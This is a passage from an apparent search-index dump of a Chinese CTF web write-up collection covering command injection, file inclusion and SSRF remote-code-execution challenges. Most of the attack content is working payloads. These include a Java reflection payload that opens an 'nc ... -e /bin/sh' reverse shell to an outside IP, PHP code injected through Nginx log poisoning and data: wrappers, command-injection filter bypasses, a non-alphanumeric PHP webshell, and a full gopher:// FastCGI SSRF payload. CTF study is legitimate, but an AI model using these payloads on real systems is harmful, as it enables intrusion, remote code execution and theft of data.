/bin/sh'))\",\n\"limit\": \"60\"\n}\n</code></pre> <p>\u4e0b\u9762\u6765\u89e3\u6790\u4e0b\u8fd9\u6bb5 payload</p> <pre><code>// ''.getClass(): \u83b7\u53d6\u7a7a\u5b57\u7b26\u4e32\u7684 Class \u5bf9\u8c61\n''.getClass().forName('java.lang.Run'+'time')   // .forName('java.lang.Run'+'time'): \u52a8\u6001\u52a0\u8f7d java.lang.Runtime \u7c7b\u5e76\u8fd4\u56de\u5176 Class \u5bf9\u8c61\n  .getMethod('exec',''.getClass())  // \u83b7\u53d6 Runtime.exec(String) \u65b9\u6cd5\u7684 Method \u5bf9\u8c61\n  .invoke(\n    ''.getClass().forName('java.lang.Run'+'time')   // \u518d\u6b21\u83b7\u53d6 Runtime \u7c7b\n      .getMethod('getRu'+'ntime')   // \u83b7\u53d6\u9759\u6001\u65b9\u6cd5 getRuntime()\n      .invoke(null),    // \u8c03\u7528\u8be5\u65b9\u6cd5\uff08invoke(null) \u56e0\u4e3a\u8fd9\u662f\u9759\u6001\u65b9\u6cd5\uff09,\u8fd4\u56de Runtime \u7c7b\u7684\u5355\u4f8b\u5b9e\u4f8b\n    'nc 144.34.162.13 6666 -e /bin/sh'  // \u4f7f\u7528\u524d\u9762\u83b7\u53d6\u7684 exec \u65b9\u6cd5\uff0c\u5728 Runtime \u5b9e\u4f8b\u4e0a\u6267\u884c\u547d\u4ee4\n  )\n</code></pre> <p>\u53d1\u9001 payload</p> <p></p> <p>\u76d1\u542c\u7aef\u53e3\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-23/","title":"PHP 8.1.0 dev RCE","text":""},{"location":"Web/Chapter6/6-23/#php-810-dev-rce","title":"PHP 8.1.0 dev RCE","text":"<p>\u6253\u5f00\u9875\u9762</p> <p></p> <p>\u6293\u5305\u770b\u62ff\u5230\u4e86\u6cc4\u9732\u7684 PHP \u7248\u672c</p> <p></p> <p>\u7f51\u4e0a\u627e nday \u590d\u73b0</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-24/","title":"nl /* \u7ed5\u8fc7\u957f\u5ea6\u9650\u5236","text":""},{"location":"Web/Chapter6/6-24/#nl--\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236","title":"nl /* \u7ed5\u8fc7\u957f\u5ea6\u9650\u5236","text":"<p>\u9650\u5236\u4e86\u6211\u4eec\u957f\u5ea6\u5728 5 \u4ee5\u4e3a</p> <p></p> <p>\u53d1\u73b0 flag \u5728\u6839\u76ee\u5f55\u4e0b</p> <pre><code>?com=ls%20/\n</code></pre> <p></p> <p>\u4f7f\u7528 <code>nl</code> \u67e5\u770b\uff0c<code>nl</code> \u7528\u4e8e\u663e\u793a\u6587\u672c\u5e76\u8f93\u51fa\u884c\u53f7</p> <pre><code>?com=nl%20/*\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-25/","title":"Nginx \u65e5\u5fd7 RCE","text":""},{"location":"Web/Chapter6/6-25/#nginx-\u65e5\u5fd7-rce","title":"Nginx \u65e5\u5fd7 RCE","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <p></p> <p>\u6587\u4ef6\u5305\u542b\u662f\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\u7684\uff0c\u4f46\u662f\u6ca1\u6709 <code>/flag</code> \u6587\u4ef6</p> <p></p> <p>\u5206\u6790\u67b6\u6784\u4e3a Nginx \u670d\u52a1\u5668</p> <p></p> <p>\u5c1d\u8bd5\u8bbf\u95ee\u65e5\u5fd7\u6587\u4ef6 <code>/var/log/nginx/error.log</code> \u548c <code>/var/log/nginx/access.log</code></p> <p></p> <p>\u53d1\u73b0 <code>access.log</code> \u88ab\u8bbe\u7f6e\u4e3a\u4e86 UA \u5934</p> <p></p> <p>\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u6539 UA \u5934\u4e3a PHP \u4ee3\u7801</p> <pre><code>User-Agent: &lt;?php echo system('ls');?&gt;\n</code></pre> <p></p> <p>\u518d\u67e5\u770b <code>flag.php</code></p> <pre><code>User-Agent: &lt;?php system('cat flag.php');?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-26/","title":"data \u4f2a\u534f\u8bae\u53bb\u6389\u53cc\u659c\u6760\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-26/#data-\u4f2a\u534f\u8bae\u53bb\u6389\u53cc\u659c\u6760\u7ed5\u8fc7","title":"data \u4f2a\u534f\u8bae\u53bb\u6389\u53cc\u659c\u6760\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n\nif(isset($_GET['file'])){\n        $file = $_GET['file'];\n}\n// \u5047\u5982\u6211\u589e\u52a0\u4e86\u8fc7\u6ee4\uff0c\u4f60\u53c8\u8be5\u5982\u4f55\u5e94\u5bf9\u5462\uff1f\nif(preg_match('/php:\\/\\/|file:\\/\\/|flag|http:\\/\\/|log|phar:\\/\\/|data:\\/\\//i', $file)){\n        echo 'No No No !';\n}\nelse{\n        include $file;\n}\n</code></pre> <p></p> <p>\u8fd9\u91cc\u7684\u6b63\u5219\u53ea\u5339\u914d\u4e86 <code>data://</code>\uff0c\u6ca1\u6709\u8fc7\u6ee4\u6574\u4e2a <code>data</code> \u4f2a\u534f\u8bae\uff0c\u6240\u4ee5\u6211\u4eec\u53bb\u6389 <code>//</code> \u5373\u53ef\u7ed5\u8fc7</p> <pre><code>?file=data:text/plain,&lt;?php system('cat /fl\\ag');?&gt;\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-27/","title":"\u5173\u952e\u5b57+\u53cc\u5f15\u53f7\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-27/#\u5173\u952e\u5b57\u53cc\u5f15\u53f7\u7ed5\u8fc7","title":"\u5173\u952e\u5b57+\u53cc\u5f15\u53f7\u7ed5\u8fc7","text":"<p>\u9ed8\u8ba4\u7ed9\u51fa\u4e86 <code>.</code>\uff0c\u70b9\u51fb\u6d4f\u89c8\u770b\u8f93\u51fa\u683c\u5f0f\u5e94\u8be5\u662f\u6267\u884c\u4e86 <code>ls</code></p> <p></p> <p>\u5148 fuzz \u6d4b\u8bd5</p> <p></p> <p>\u53d1\u73b0\u53cc\u5f15\u53f7\u6ca1\u6709\u8fc7\u6ee4\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528\u53cc\u5f15\u53f7\u7ed5\u8fc7</p> <pre><code>ca\"\"t == cat\n</code></pre> <p></p> <p>\u540e\u7eed\u53c2\u8003\u4e0b\u4e00\u8282 TAB</p> <pre><code>&amp;   ca\"\"t   /fl\"\"ag\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-28/","title":"Tab \u952e\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-28/#tab-\u952e\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","title":"Tab \u952e\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":"<p>\u9ed8\u8ba4\u7ed9\u51fa\u4e86 <code>.</code>\uff0c\u70b9\u51fb\u6d4f\u89c8\u770b\u8f93\u51fa\u683c\u5f0f\u5e94\u8be5\u662f\u6267\u884c\u4e86 <code>ls</code></p> <p></p> <p>\u5148 fuzz \u6d4b\u8bd5</p> <p></p> <p>\u53d1\u73b0\u53cc\u5f15\u53f7\u6ca1\u6709\u8fc7\u6ee4\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528\u53cc\u5f15\u53f7\u7ed5\u8fc7</p> <pre><code>ca\"\"t == cat\n</code></pre> <p></p> <p>\u4f46\u662f\u7a7a\u683c\u88ab\u8fc7\u6ee4\u4e86\uff0c\u53ef\u4ee5\u4f7f\u7528 TAB \u952e\u4ee3\u66ff\uff08\u9700\u8981\u81ea\u5df1\u627e\u4e2a\u6587\u672c\u7f16\u8f91\u91cc\u6309\u51fa\u6765\u7136\u540e\u590d\u5236\u7c98\u8d34\uff09</p> <pre><code>&amp;   ca\"\"t   /fl\"\"ag\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-29/","title":"< \u52a0 |Base64 \u7ed5\u8fc7\u7a7a\u683c","text":""},{"location":"Web/Chapter6/6-29/#-\u52a0-base64-\u7ed5\u8fc7\u7a7a\u683c","title":"&lt; \u52a0 |Base64 \u7ed5\u8fc7\u7a7a\u683c","text":"<p>\u8f93\u5165 <code>127.0.0.1&amp;ls</code> \u770b\u5230 flag \u6587\u4ef6</p> <p></p> <p>\u5229\u7528\u91cd\u5b9a\u5411\u914d\u5408 Base64 \u62ff\u5230 flag</p> <pre><code>127.0.0.1&amp;cat&lt;flag_94851679315785.php|base64\n</code></pre> <p>`</p>"},{"location":"Web/Chapter6/6-3/","title":"\u81ea\u589e\u4ee3\u66ff\u5173\u952e\u5b57\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-3/#\u81ea\u589e\u4ee3\u66ff\u5173\u952e\u5b57\u7ed5\u8fc7","title":"\u81ea\u589e\u4ee3\u66ff\u5173\u952e\u5b57\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u62ff\u5230\u6e90\u4ee3\u7801\uff0c\u9996\u5148\u662f POST \u53c2\u6570 code \u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc7 105</p> <p>\u5176\u6b21\u662f\u4e0d\u5305\u542b\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7279\u6b8a\u5b57\u7b26\uff0c\u6700\u540e\u901a\u8fc7 eval() \u6267\u884c</p> <p></p> <p>\u904d\u5386\u6b63\u5219\u53d1\u73b0 !$'()+,./;=[]_ \u6ca1\u6709\u8fc7\u6ee4</p> <p>NaN \u8868\u793a\u672a\u5b9a\u4e49\u6216\u4e0d\u53ef\u8868\u793a\u7684\u503c\uff0c\u53ef\u4ee5\u7528 (0/0) \u8868\u793a</p> <p>\u56e0\u4e3a\u8fc7\u6ee4\u4e86\u6570\u5b57\uff0c\u6240\u4ee5\u8fd9\u91cc\u7528 _ \u4ee3\u66ff\uff0c\u5f97\u5230 float(NAN)</p> <p></p> <p>\u6211\u4eec\u9700\u8981\u5b57\u7b26\u4e32\u7c7b\u578b\u7684 NaN\uff0c\u52a0\u4e0a ._ \u62fc\u63a5\u8f6c\u4e3a\u5b57\u7b26\u4e32</p> <p></p> <p>\u518d\u901a\u8fc7\u6570\u7ec4\u4e0b\u6807\u63d0\u53d6\u51fa\u5b57\u7b26 N</p> <p></p> <p>\u62ff\u5230\u5b57\u7b26 N \u540e\u901a\u8fc7\u81ea\u589e\u7684\u5f62\u5f0f\u62ff\u5230\u5176\u4ed6\u5b57\u7b26</p> <p></p> <p>\u6574\u4f53\u811a\u672c\u5982\u4e0b</p> <pre><code>&lt;?php\n$_=(_/_._)[_];\n//var_dump($_);  //\"N\"\n$_++;       //\"O\"\n//var_dump($_++);\n$__=$_.$_++;   //\"PO\"\n$_++;         //\"Q\"\n//var_dump($_++);\n$_++;         //\"R\"\n$_++;         //\"S\"\n//var_dump($_++);\n$__=$__.$_;  //\"POS\"\n//var_dump($__);\n$_++;        //\"T\"\n//var_dump($_++);\n$__=$__.$_;  //\"POST\"\n//var_dump($__);\n$_=_.$__;    //_POST\n//var_dump($_);\n$$_[_]($$_[__]);\n//&amp;_=system&amp;__=cat /flag\n\n//code=$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$__=$__.$_;$_++;$__=$__.$_;$_=_.$__;$$_[_]($$_[__]);&amp;_=system&amp;__=whoami\n</code></pre> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-30/","title":"; \u4ee3\u66ff & \u4e0e | \u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-30/#-\u4ee3\u66ff--\u4e0e--\u7ed5\u8fc7","title":"; \u4ee3\u66ff &amp; \u4e0e | \u7ed5\u8fc7","text":"<p>\u8fc7\u6ee4\u4e86 <code>|</code> \u4e0e <code>&amp;</code> \uff0c\u90a3\u6211\u4eec\u5c31\u4f7f\u7528 <code>;</code> \u5206\u9694\u547d\u4ee4\u6765\u4ee3\u66ff</p> <p></p>"},{"location":"Web/Chapter6/6-31/","title":"\u661f\u53f7\u4ee3\u66ff\u90e8\u5206\u5173\u952e\u5b57\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-31/#-\u4ee3\u66ff\u90e8\u5206\u5173\u952e\u5b57\u7ed5\u8fc7","title":"* \u4ee3\u66ff\u90e8\u5206\u5173\u952e\u5b57\u7ed5\u8fc7","text":"<p>\u67e5\u770b flag_is_here \u6587\u4ef6\u5939\u4e0b\u7684\u6587\u4ef6</p> <pre><code># %0a - URL \u7f16\u7801\u7684\u6362\u884c\u7b26\uff08LF\uff0cASCII 0x0A\uff09\n# \u5728\u547d\u4ee4\u884c\u4e2d\uff0c\u6362\u884c\u7b26\u53ef\u4ee5\u7528\u4e8e\u5206\u9694\u547d\u4ee4\uff0c\u53ef\u80fd\u7528\u4e8e\u6ce8\u5165\u989d\u5916\u547d\u4ee4\n# %09 - URL \u7f16\u7801\u7684\u6c34\u5e73\u5236\u8868\u7b26\uff08TAB\uff0cASCII 0x09\uff09\n# * \u5339\u914d\u4efb\u610f\u5b57\u7b26\n127.0.0.1%0als%09*is_here\n</code></pre> <p></p> <p>\u62ff\u5230 flag</p> <pre><code>127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_100171326731527.php\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-32/","title":"0a \u4ee3\u66ff ; \u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-32/#0a-\u4ee3\u66ff--\u7ed5\u8fc7","title":"%0a \u4ee3\u66ff ; \u7ed5\u8fc7","text":"<p>\u67e5\u770b flag_is_here \u6587\u4ef6\u5939\u4e0b\u7684\u6587\u4ef6</p> <pre><code># %0a - URL \u7f16\u7801\u7684\u6362\u884c\u7b26\uff08LF\uff0cASCII 0x0A\uff09\n# \u5728\u547d\u4ee4\u884c\u4e2d\uff0c\u6362\u884c\u7b26\u53ef\u4ee5\u7528\u4e8e\u5206\u9694\u547d\u4ee4\uff0c\u53ef\u80fd\u7528\u4e8e\u6ce8\u5165\u989d\u5916\u547d\u4ee4\n# %09 - URL \u7f16\u7801\u7684\u6c34\u5e73\u5236\u8868\u7b26\uff08TAB\uff0cASCII 0x09\uff09\n# * \u5339\u914d\u4efb\u610f\u5b57\u7b26\n127.0.0.1%0als%09*is_here\n</code></pre> <p></p> <p>\u62ff\u5230 flag</p> <pre><code>127.0.0.1%0acd%09*_is_here%0aca%5ct%09*_100171326731527.php\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-33/","title":"SSRF FastCGI \u534f\u8bae RCE","text":""},{"location":"Web/Chapter6/6-33/#ssrf-fastcgi-\u534f\u8bae-rce","title":"SSRF FastCGI \u534f\u8bae RCE","text":"<p>1\ufe0f\u20e3 FastCGI \u7b80\u4ecb</p> <p>FastCGI \u662f\u4e00\u79cd\u901a\u7528\u7f51\u5173\u63a5\u53e3\uff08CGI\uff09\u7684\u6539\u8fdb\u7248\u672c\uff0c\u65e8\u5728\u89e3\u51b3\u4f20\u7edf CGI \u5b58\u5728\u7684\u6027\u80fd\u95ee\u9898</p> <p>\u4f20\u7edf  CGI  \u6bcf\u6b21\u8bf7\u6c42\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8fdb\u7a0b\uff0c\u5904\u7406\u5b8c\u8bf7\u6c42\u540e\u9500\u6bc1\uff0c\u6781\u5927\u6d6a\u8d39\u7cfb\u7edf\u8d44\u6e90</p> <p>\u800c FastCGI \u901a\u8fc7\u957f\u8fde\u63a5\u4e0e\u8fdb\u7a0b\u590d\u7528\u673a\u5236\uff0c\u663e\u8457\u63d0\u9ad8\u4e86\u6027\u80fd</p> <p>FastCGI \u901a\u5e38\u7528\u4e8e\uff1a</p> <ul> <li>Web \u670d\u52a1\u5668\uff08\u5982 Nginx\u3001Apache\uff09\u4e0e\u540e\u7aef\u5e94\u7528\uff08\u5982 PHP-FPM\uff09\u4e4b\u95f4\u7684\u901a\u4fe1</li> <li>\u4fdd\u6301\u540e\u7aef\u670d\u52a1\u8fdb\u7a0b\u5e38\u9a7b\uff0c\u63d0\u9ad8\u9ad8\u5e76\u53d1\u4e0b\u7684\u6027\u80fd</li> </ul> <p>2\ufe0f\u20e3 FastCGI \u67b6\u6784\u6982\u89c8</p> <p>\u901a\u4fe1\u53cc\u65b9\uff1a</p> <ul> <li>Web \u670d\u52a1\u5668\uff1a\u5ba2\u6237\u7aef\u8bf7\u6c42\u5165\u53e3\uff0c\u5982 Nginx</li> <li>FastCGI \u5e94\u7528\u7a0b\u5e8f\uff1a\u901a\u5e38\u662f PHP-FPM \u6216\u5176\u4ed6\u5e94\u7528\u670d\u52a1\u5668</li> </ul> <p>\u5de5\u4f5c\u6d41\u7a0b\uff1a</p> <pre><code>[\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668] \n     \u2193\n[Web \u670d\u52a1\u5668 (\u5982 Nginx)]  \u2014\u2014TCP/Unix Socket\u2014\u2014&gt;  [FastCGI \u540e\u7aef (\u5982 PHP-FPM)]\n</code></pre> <ul> <li>Web \u670d\u52a1\u5668\u628a\u8bf7\u6c42\u5c01\u88c5\u6210 FastCGI \u534f\u8bae\u683c\u5f0f\uff0c\u901a\u8fc7 Socket \u53d1\u7ed9 FastCGI \u8fdb\u7a0b</li> <li>FastCGI \u8fdb\u7a0b\u89e3\u6790\u8bf7\u6c42\uff0c\u6267\u884c\u540e\u7aef\u903b\u8f91\uff0c\u8fd4\u56de\u54cd\u5e94\u6570\u636e</li> <li>Web \u670d\u52a1\u5668\u518d\u5c06\u7ed3\u679c\u8fd4\u8fd8\u7ed9\u5ba2\u6237\u7aef</li> </ul> <p>3\ufe0f\u20e3 FastCGI \u534f\u8bae\u7ed3\u6784</p> <p>\u6570\u636e\u4f20\u8f93\u7684\u57fa\u672c\u5355\u4f4d\uff1aRecord\uff08\u8bb0\u5f55\uff09</p> <p>\u6bcf\u4e2a Record \u6709\u56fa\u5b9a\u5934\u90e8\u683c\u5f0f\u548c\u53ef\u53d8\u957f\u5ea6\u7684\u6570\u636e\u90e8\u5206\u3002</p> <p>Record Header\uff088 \u5b57\u8282\uff09\u7ed3\u6784\uff1a</p> \u5b57\u6bb5 \u5927\u5c0f\uff08\u5b57\u8282\uff09 \u8bf4\u660e Version 1 FastCGI \u7248\u672c\uff0c\u901a\u5e38\u662f <code>1</code> Type 1 \u8bb0\u5f55\u7c7b\u578b\uff08\u89c1\u4e0b\u8868\uff09 RequestId 2 \u8bf7\u6c42 ID\uff08\u7528\u4e8e\u591a\u8def\u590d\u7528\uff09 ContentLength 2 \u5185\u5bb9\u957f\u5ea6 PaddingLength 1 \u586b\u5145\u5b57\u8282\u957f\u5ea6\uff08\u7528\u4e8e\u5bf9\u9f50\uff09 Reserved 1 \u4fdd\u7559\uff0c\u901a\u5e38\u4e3a <code>0</code> <p>\u5e38\u89c1 Type \u7c7b\u578b\uff1a</p> \u7c7b\u578b\u540d \u503c \u8bf4\u660e FCGI_BEGIN_REQUEST 1 \u8868\u793a\u5f00\u59cb\u4e00\u4e2a\u8bf7\u6c42 FCGI_ABORT_REQUEST 2 \u8868\u793a\u4e2d\u65ad\u8bf7\u6c42 FCGI_END_REQUEST 3 \u8868\u793a\u8bf7\u6c42\u7ed3\u675f FCGI_PARAMS 4 \u53d1\u9001\u8bf7\u6c42\u7684\u73af\u5883\u53d8\u91cf FCGI_STDIN 5 \u53d1\u9001\u8bf7\u6c42\u4e3b\u4f53\uff08\u5982 POST \u6570\u636e\uff09 FCGI_STDOUT 6 \u6807\u51c6\u8f93\u51fa\uff08\u8fd4\u56de\u5185\u5bb9\uff09 FCGI_STDERR 7 \u6807\u51c6\u9519\u8bef\uff08\u8fd4\u56de\u9519\u8bef\u4fe1\u606f\uff09 FCGI_DATA 8 \u8865\u5145\u6570\u636e\uff08\u5f88\u5c11\u7528\uff09 <p>4\ufe0f\u20e3 \u901a\u4fe1\u8fc7\u7a0b\u8be6\u7ec6\u6b65\u9aa4</p> <p>\u4e00\u6b21 HTTP \u8bf7\u6c42\u901a\u5e38\u5305\u542b\u4ee5\u4e0b FastCGI Record\uff1a</p> <pre><code>\u2460 FCGI_BEGIN_REQUEST        # \u5f00\u59cb\u8bf7\u6c42\n\u2461 FCGI_PARAMS (\u591a\u6b21)         # \u73af\u5883\u53d8\u91cf\uff08\u5982 PATH_INFO\u3001QUERY_STRING \u7b49\uff09\n\u2462 FCGI_PARAMS (\u7a7a)           # \u7a7a\u8868\u793a\u7ed3\u675f\n\u2463 FCGI_STDIN (\u53ef\u80fd\u591a\u6b21)      # \u8bf7\u6c42\u4f53\uff0c\u5982 POST \u6570\u636e\n\u2464 FCGI_STDIN (\u7a7a)            # \u7a7a\u8868\u793a\u7ed3\u675f\n----------------------------\n\u2465 FCGI_STDOUT (\u8fd4\u56de\u5185\u5bb9)\n\u2466 FCGI_STDERR (\u9519\u8bef\u4fe1\u606f)\n\u2467 FCGI_END_REQUEST           # \u901a\u77e5\u8bf7\u6c42\u7ed3\u675f\n</code></pre> <p>5\ufe0f\u20e3 \u8bf7\u6c42\u793a\u4f8b\uff08\u4f2a\u8fc7\u7a0b\uff09</p> <pre><code>\u5ba2\u6237\u7aef\u53d1\u8d77 HTTP \u8bf7\u6c42\uff1aGET /index.php?id=1\n\nNginx \u751f\u6210 FastCGI \u8bf7\u6c42\uff1a\n1\ufe0f\u20e3 \u53d1\u9001 BEGIN_REQUEST\n2\ufe0f\u20e3 \u53d1\u9001 PARAMS\uff08SCRIPT_FILENAME, QUERY_STRING \u7b49\uff09\n3\ufe0f\u20e3 \u53d1\u9001\u7a7a PARAMS\n4\ufe0f\u20e3 \uff08GET \u6ca1\u6709 STDIN\uff09\n5\ufe0f\u20e3 \u7b49\u5f85 FastCGI \u8fd4\u56de\u6570\u636e\n</code></pre> <p>FastCGI \u8fd4\u56de\uff1a</p> <ul> <li>STDOUT: \u8f93\u51fa HTML \u5185\u5bb9</li> <li>STDERR: \u9519\u8bef\u65e5\u5fd7\uff08\u5982\u679c\u6709\uff09</li> <li>END_REQUEST: \u8bf7\u6c42\u7ed3\u675f</li> </ul> <p>6\ufe0f\u20e3 PHP-FPM \u7b80\u4ecb</p> <p>PHP-FPM \u662f\u4e13\u95e8\u4e3a PHP \u63d0\u4f9b\u66f4\u9ad8\u6548\u3001\u66f4\u7a33\u5b9a\u7684\u8fdb\u7a0b\u7ba1\u7406\u673a\u5236\u7684 FastCGI \u5b9e\u73b0\uff0c\u5e38\u7528\u4e8e\u914d\u5408 Nginx \u90e8\u7f72 PHP \u7f51\u7ad9</p> <pre><code>\u6d4f\u89c8\u5668\u8bf7\u6c42 --&gt; Nginx --&gt; PHP-FPM --&gt; PHP \u811a\u672c\u6267\u884c --&gt; \u8fd4\u56de\u7ed3\u679c\n</code></pre> <p>7\ufe0f\u20e3\u653b\u51fb\u539f\u7406</p> <pre><code>+----------------------+\n|   \u653b\u51fb\u8005\u53d1\u8d77\u8bf7\u6c42     |\n+----------------------+\n            |\n            v\n+----------------------------------+\n| PHP-FPM \u7aef\u53e3 9000 \u662f\u5426\u66b4\u9732\u516c\u7f51\uff1f    |\n+----------------------------------+\n      |                      |\n      | \u662f                   | \u5426\n      v                      v\n+------------------+   +-------------------+\n|  \u76f4\u63a5\u6784\u9020 FastCGI|   |  SSRF \u8bbf\u95ee 127.0.0.1|\n|   \u6570\u636e\u5305\u653b\u51fbFPM  |   |   \u8bf7\u6c42 FastCGI \u7aef\u53e3  |\n+------------------+   +-------------------+\n      |                      |\n      +----------+-----------+\n                 v\n       +----------------------------+\n       |   SCRIPT_FILENAME \u53c2\u6570\u63a7\u5236  |\n       +----------------------------+\n                 |\n     +-----------------------------+\n     |  \u6587\u4ef6\u540e\u7f00\u662f\u5426\u53d7\u9650\u5236\uff1f        |\n     +-----------------------------+\n         |                    |\n         | \u8001\u7248\u672c\uff0c\u4e0d\u53d7\u9650       | \u65b0\u7248\u672c\uff0c\u4ec5\u9650 .php\n         v                    v\n+----------------+     +---------------------+\n| \u4efb\u610f\u6587\u4ef6\u53ef\u5229\u7528 |     | \u53ea\u80fd\u5229\u7528\u5df2\u6709 .php \u6587\u4ef6 |\n+----------------+     +---------------------+\n         |                    |\n         v                    v\n+--------------------+  +----------------------+\n| \u53ef\u8bfb\u53d6 /etc/passwd |  | \u6267\u884c\u6307\u5b9a PHP \u811a\u672c\uff0c      |\n| \u6216\u5176\u4ed6\u4efb\u610f\u6587\u4ef6     |  | \u8fbe\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c       |\n+--------------------+  +----------------------+\n</code></pre> <p>\u672c\u6587\u8981\u5229\u7528\u4e00\u4e2a\u811a\u672c gopherus.py\uff0c\u8fd9\u4e2a\u811a\u672c\u53ef\u4ee5\u5bf9 SSRF \u6f0f\u6d1e\u8fdb\u884c\u5229\u7528\uff0c\u53ef\u4ee5\u76f4\u63a5\u751f\u6210 payload \u9020\u6210\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c RCE</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/Gopherus]\n\u2514\u2500$ python2 gopherus.py -h                                                             \nusage: gopherus.py [-h] [--exploit EXPLOIT]\n\noptional arguments:\n  -h, --help         show this help message and exit\n  --exploit EXPLOIT  mysql, postgresql, fastcgi, redis, smtp, zabbix,\n                     pymemcache, rbmemcache, phpmemcache, dmpmemcache\n</code></pre> <p>\u6211\u4eec\u9009\u62e9 fastcgi \u7684</p> <pre><code>python2 gopherus.py --exploit fastcgi\n</code></pre> <p></p> <p>\u7136\u540e\u8f93\u5165 <code>/var/www/index.php</code>\uff0c\u8fd0\u884c\u4e00\u4e0b ls</p> <p></p> <p>\u5f97\u5230 payload</p> <p></p> <pre><code>gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH54%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%006%04%00%3C%3Fphp%20system%28%27ls%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00\n</code></pre> <p>\u518d\u505a\u4e00\u6b21 URL \u7f16\u7801\uff08\u56e0\u4e3a\u8d70\u7684\u662f <code>?url</code>\uff09</p> <pre><code>gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH54%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25006%2504%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6709\u4e2a <code>index.php</code></p> <p></p> <p>\u91cd\u65b0\u8dd1\u4e00\u4e0b\u811a\u672c\u62ff flag</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-34/","title":"Redis \u534f\u8bae RCE","text":""},{"location":"Web/Chapter6/6-34/#redis-\u534f\u8bae-rce","title":"Redis \u534f\u8bae RCE","text":""},{"location":"Web/Chapter6/6-34/#1-ssrf-\u4e0e-redis-\u7ed3\u5408\u7684\u6838\u5fc3\u601d\u8def","title":"1\ufe0f\u20e3 SSRF \u4e0e Redis \u7ed3\u5408\u7684\u6838\u5fc3\u601d\u8def","text":"<p>\u5229\u7528 SSRF\uff08Server-Side Request Forgery\uff0c\u670d\u52a1\u7aef\u8bf7\u6c42\u4f2a\u9020\uff09\uff0c\u8ba9\u670d\u52a1\u5668\u4e3b\u52a8\u53bb\u8bf7\u6c42\u653b\u51fb\u8005\u6307\u5b9a\u7684 Redis \u670d\u52a1\uff08\u6216\u5185\u7f51\u672a\u6388\u6743\u7684 Redis \u670d\u52a1\uff09\uff0c\u5e76\u5411 Redis \u5199\u5165\u6076\u610f payload\uff0c\u4ece\u800c\u8fdb\u4e00\u6b65\u5b9e\u73b0 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff08RCE\uff09</p> <p>2\ufe0f\u20e3 SSRF Redis RCE \u5e38\u89c1\u5229\u7528\u94fe</p> \u9636\u6bb5 \u52a8\u4f5c \u7b2c\u4e00\u6b65 SSRF 